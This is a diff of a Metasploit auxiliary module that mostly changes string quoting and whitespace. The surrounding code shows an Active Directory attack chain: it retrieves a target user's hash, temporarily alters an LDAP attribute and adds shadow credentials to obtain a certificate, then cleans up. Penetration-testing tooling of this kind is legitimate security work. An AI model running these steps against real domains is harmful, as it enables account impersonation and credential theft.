@@ -175,7 +175,7 @@ class MetasploitModule < Msf::Auxiliary
       'LocalOutput' => user_output,
       'RunAsJob' => false
     )
-    fail_with(Failure::Unknown, "Failed to get hash for target user") unless res
+    fail_with(Failure::Unknown, 'Failed to get hash for target user') unless res
     res
   end
 
@@ -183,7 +183,7 @@ class MetasploitModule < Msf::Auxiliary
     new_value = datastore['UPDATE_LDAP_OBJECT_VALUE']
     # Get the original while updating (the update action returns the original value upon success)
     @original_value = call_ldap_object_module('UPDATE', new_value)
-    fail_with(Failure::BadConfig,"The #{datastore['UPDATE_LDAP_OBJECT']} of #{datastore['TARGET_USERNAME']} is already set to #{datastore['UPDATE_LDAP_OBJECT_VALUE']}. After the module completes running it will revert the attribute to it's original value which will cause the certificate produced to throw a KDC_ERR_CLIENT_NAME_MISMATCH when attempting to use it. Try setting the #{datastore['UPDATE_LDAP_OBJECT']} of #{datastore['TARGET_USERNAME']} to anything but #{datastore['UPDATE_LDAP_OBJECT_VALUE']} using the ldap_object_attribute module and then rerun this module.") if @original_value.present? && @original_value.casecmp?(datastore['UPDATE_LDAP_OBJECT_VALUE'])
+    fail_with(Failure::BadConfig, "The #{datastore['UPDATE_LDAP_OBJECT']} of #{datastore['TARGET_USERNAME']} is already set to #{datastore['UPDATE_LDAP_OBJECT_VALUE']}. After the module completes running it will revert the attribute to it's original value which will cause the certificate produced to throw a KDC_ERR_CLIENT_NAME_MISMATCH when attempting to use it. Try setting the #{datastore['UPDATE_LDAP_OBJECT']} of #{datastore['TARGET_USERNAME']} to anything but #{datastore['UPDATE_LDAP_OBJECT_VALUE']} using the ldap_object_attribute module and then rerun this module.") if @original_value.present? && @original_value.casecmp?(datastore['UPDATE_LDAP_OBJECT_VALUE'])
 
     # Call the shadow credentials module to add the device and get the cert path
     print_status("Adding shadow credentials for #{datastore['TARGET_USERNAME']}")
@@ -199,9 +199,9 @@ class MetasploitModule < Msf::Auxiliary
     end
   ensure
     restore_auth_datastore_options
-    print_status("Removing shadow credential")
+    print_status('Removing shadow credential')
     call_shadow_credentials_module('remove', device_id: @device_id)
-    print_status("Reverting ldap object")
+    print_status('Reverting ldap object')
     revert_ldap_object
   end
 
@@ -209,6 +209,7 @@ class MetasploitModule < Msf::Auxiliary
     @saved_datastore_options = {}
     datastore.each do |key, value|
       next unless key == 'SMBPass' || key == 'SMBUser' || key == 'LDAPUsername' || key == 'LDAPPassword'
+
       if value.present?
         @saved_datastore_options[key] = value
         datastore[key] = ''
